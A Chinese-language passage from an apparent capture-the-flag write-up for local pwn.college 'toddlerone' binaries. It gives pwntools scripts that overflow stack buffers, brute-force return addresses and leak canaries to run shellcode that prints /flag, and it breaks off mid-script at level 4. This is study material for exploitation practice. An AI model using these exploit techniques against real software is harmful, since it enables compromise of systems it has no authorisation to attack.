class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-传递到-main"><a href="#6-传递到-main" class="headerlink" title="6. 传递到 main()"></a>6. <strong>传递到 <code>main()</code></strong></h4><p>在准备好堆栈后，操作系统会将控制权交给程序的入口点，即 <code>_start</code> 函数。<code>_start</code> 函数是程序的实际入口点，它负责初始化运行时环境，然后调用 <code>main()</code> 函数。</p><p>当 <code>_start</code> 函数调用 <code>main()</code> 时，它会将 <code>argc</code>、<code>argv</code>、<code>envp</code> 的地址分别传递给 <code>main()</code> 函数的参数，这就是为什么 <code>main()</code> 能够接收到这些参数。</p><h4 id="7-程序开始执行"><a href="#7-程序开始执行" class="headerlink" title="7. 程序开始执行"></a>7. <strong>程序开始执行</strong></h4><p>这样，<code>main()</code> 函数中的 <code>argc</code>、<code>argv</code> 和 <code>envp</code> 就分别持有了命令行参数的数量、命令行参数的指针数组和环境变量的指针数组。程序员可以通过这些参数访问命令行传递给程序的信息以及程序的运行环境。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul><li><code>argc</code>: 命令行参数的数量，由操作系统传递。</li><li><code>argv</code>: 指向命令行参数字符串的指针数组，每个元素都是一个指向某个命令行参数的指针。</li><li><code>envp</code>: 指向环境变量字符串的指针数组，每个元素都是一个指向某个环境变量的指针。</li></ul><p>这些参数是在程序启动时，由操作系统在堆栈上准备好，然后通过 <code>_start</code> 函数传递给 <code>main()</code> 函数的。</p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>没有开启canary，首先使用mmap创建一个内存空间读取shellcode，这个地址是确定的，所以后续只要直接跳转到这个地址就可以了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level1.0"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level1.0"</span><span class="token punctuation">)</span>raw_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level1/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>raw_file <span class="token operator">=</span> raw_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># file_bytes = len(raw_file)</span><span class="token keyword">print</span><span class="token punctuation">(</span>raw_file<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>raw_file<span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">15</span> <span class="token operator">*</span> <span class="token number">8</span> padding_size <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">3</span>rbp <span class="token operator">=</span> <span class="token number">8</span>address_ <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x1FF69000</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token punctuation">(</span>buffer_size <span class="token operator">+</span> padding_size <span class="token operator">+</span> rbp<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> address_p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""BITS 64section .data    filename '/flag',0section .bss    buffer resb 50section .textglobal _start_start:    xor rax, rax    mov rax, 2    lea rdi, [rel filename]    xor rsi, rsi    syscall    mov rdi, rax    lea rsi, [rel buffer]    mov rdx, 100    xor rax, rax    syscall    mov rdi, 1    mov rdx, rax    mov rax, 1     syscall """</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><h3 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h3><p>没有开启ASLR，没有开启canary。栈空间具有可执行权限。</p><p>将二进制代码写入栈中，然后覆盖返回地址为缓冲区起始地址即可。还是用的level1中的shellcode</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level2.0"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level2.0"</span><span class="token punctuation">)</span>raw_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level1/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>raw_file <span class="token operator">=</span> raw_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>file_bytes <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>raw_file<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_bytes<span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">56</span>padding_size <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">*</span><span class="token number">3</span>rbp <span class="token operator">=</span> <span class="token number">8</span>address_ <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x7fffffffce60</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> raw_file <span class="token operator">+</span> <span class="token punctuation">(</span>buffer_size <span class="token operator">+</span> padding_size <span class="token operator">+</span> rbp <span class="token operator">-</span> file_bytes<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> address_p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h3><p>这一关没有回显了，所以你不能通过回显来判断返回地址应该写成啥。</p><p>gdb调试的话，对应的栈空间是会发生变化的。因为gdb可能会添加一些栈帧进去。所以用gdb显示的地址也不行。</p><p>但是因为本题关闭了PIE，所以每次栈空间的基址是一样的。<br><code>   0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rwxp   [stack]</code></p><p>用gdb查看的话，返回地址应该是 <code>0x7fffffffcf28</code>。但是gdb返回的栈空间和实际运行的栈空间有差距。</p><p>我通过之前2.0的程序观察，单独运行程序，栈基址是 <code>0x7fffffffcf50</code>，运行gdb查看程序的话，栈基址是 <code>0x7fffffffcef0</code><br>差距不大。</p><p>所以我选择从 <code>0x7ffffffc000</code>开始爆破。最终正确的地址是 <code>0x7ffffffce20</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>raw_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level1/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>raw_file <span class="token operator">=</span> raw_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>file_bytes <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>raw_file<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level2.1"</span><span class="token punctuation">)</span>base_address <span class="token operator">=</span> <span class="token number">0x7fffffffc000</span><span class="token comment"># correct_addresss = 0x7fffffffce20</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level2.1"</span><span class="token punctuation">)</span>    buffer_size <span class="token operator">=</span> <span class="token number">0x90</span>    padding_size <span class="token operator">=</span> <span class="token number">0</span>    rbp <span class="token operator">=</span> <span class="token number">8</span>    address_ <span class="token operator">=</span> p64<span class="token punctuation">(</span>base_address<span class="token punctuation">)</span>    payload <span class="token operator">=</span> raw_file <span class="token operator">+</span> <span class="token punctuation">(</span>buffer_size <span class="token operator">+</span> padding_size <span class="token operator">+</span> rbp <span class="token operator">-</span> file_bytes<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> address_    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"160"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>address_<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>        p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    base_address <span class="token operator">+=</span> <span class="token number">0x10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>这个题开启了 <code>canary</code> 和 <code>PIE</code>保护。只能通过重复的缓冲区溢出，借助 <code>puts</code>的回显，获取canary的值和真正的栈空间的值。</p><p>首先challenge函数的栈空间是 <code>0x80</code>，在调用的过程中会 <code>push return_address</code> 和 <code>push rbp</code>所以这里又多了 <code>0x10</code>字节。我们可以通过 <code>REPEAT</code>重复调用 <code>challenge</code>获取 <code>canary_value</code>。再次使用 <code>REPEAT</code>，重复调用 <code>challenge</code>获取main函数调用 <code>challenge</code>时，challenge函数的栈基址。这样，我们在减去两个 <code>0x80+0x10</code>，就能获得第三次调用challenge函数时的栈基址。再减去 <code>0x40</code>就是要覆盖返回地址的栈空间的地址。shellcode就放在这里。</p><p>因为栈空间有限，所以我是用execve函数调用外部的c程序来打印flag的值。这样能节约shellcode的空间。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">challenge_3:    challenge_2函数的栈基址    ret返回地址chanllenge_2:    challenge_1函数的栈基址-------<span class="token operator">></span>第二次重复调用challenge函数就是为了获取这个，然后减去2*0x90就是challenge_3函数的栈基址    ret返回地址chanllenge_1:    mian函数的栈基址    ret返回地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level3.0"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level3.0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>init_payload_size <span class="token operator">=</span> <span class="token number">57</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span><span class="token number">57</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload_size <span class="token operator">=</span> <span class="token number">57</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0x90</span> <span class="token operator">-</span> <span class="token number">0x90</span> <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span>real_payload_size <span class="token operator">=</span> <span class="token number">56</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level3/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">56</span> <span class="token operator">-</span> shellcode_size<span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> return_addressp<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level3.1"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level3.1"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>init_payload_size <span class="token operator">=</span> <span class="token number">0x60</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload <span class="token operator">=</span> <span class="token string">b'REPEAT'</span> <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>init_payload_size <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token punctuation">:</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"canary_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>canary_value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>init_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You said: "</span><span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>stack_value <span class="token operator">=</span> response<span class="token punctuation">[</span>init_payload_size<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_value: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>return_address <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xB0</span> <span class="token operator">-</span> <span class="token number">0xB0</span> <span class="token operator">-</span> <span class="token number">0x60</span><span class="token punctuation">)</span>real_payload_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>real_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level3/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>real_payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> shellcode_size<span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> canary_value <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token string">b'A'</span> <span class="token operator">+</span> return_addressp<span class="token punctuation">.</span>send<span class="token punctuation">(</span>real_payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>这一关跟上一关的区别是，在你不传入REPEAT的情况下，他会检验一个8个字节的值，如果不对就调用exit。调用exit就不会再回到程序的执行流了，就直接退出了。所以你覆盖的返回地址就失效了。所以必须要在栈空间的构造中，填入这个值。<strong>注意数字0xbeef和真实的数据发送0xef 0xbe</strong>!</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">,</span> <span class="token string">"REPEAT"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Backdoor triggered! Repeating challenge()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">challenge</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Goodbye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This challenge will, by default, exit() instead of returning from the"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"challenge function. When a process exit()s, it ceases to exist immediately,"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"and no amount of overwritten return addresses will let you hijack its control"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"flow. You will have to reverse engineer the program to understand how to avoid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"making this challenge exit(), and allow it to return normally."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token operator">!=</span> <span class="token number">0xF58B48D72EC7B457LL</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"exit() condition triggered. Exiting!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"exit() condition avoided! Continuing execution."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level4.1"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level4.1"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Payload size: "</span><span class="token punctuation">)</span>init_payload_size <span class="token operator">=</span> <span class="token number">0x58</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>init_payload_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>init_payload <span class="token operator">=</span> <span class="token 